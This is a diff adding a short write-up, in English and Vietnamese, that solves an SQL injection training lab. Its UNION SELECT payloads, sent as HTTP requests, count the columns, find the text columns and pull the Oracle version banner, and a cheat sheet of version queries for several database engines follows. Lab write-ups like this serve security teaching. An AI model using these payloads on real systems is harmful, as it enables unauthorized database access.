@@ -1,0 +1,27 @@
+This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+
+To solve the lab, display the database version string.
+
+1. Xác định bảng có bao nhiêu cột
+GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL+from+dual-- HTTP/1.1
+
+2. Xác định cột nào có kiểu dữ liệu text
+GET /filter?category=Gifts'+UNION+SELECT+'asdf','test'+from+dual-- HTTP/1.1
+-> Cả 2 cột đều có kiểu dữ liệu text
+
+3. Xác định version của csdl
+' UNION SELECT BANNER,NULL from v$version--
+-> CORE 11.2.0.2.0 Production
+NLSRTL Version 11.2.0.2.0 - Production
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+PL/SQL Release 11.2.0.2.0 - Production
+TNS for Linux: Version 11.2.0.2.0 - Production
+
+Database version
+You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
+
+Oracle	SELECT banner FROM v$version
+SELECT version FROM v$instance
+Microsoft	SELECT @@version
+PostgreSQL	SELECT version()
+MySQL	SELECT @@version
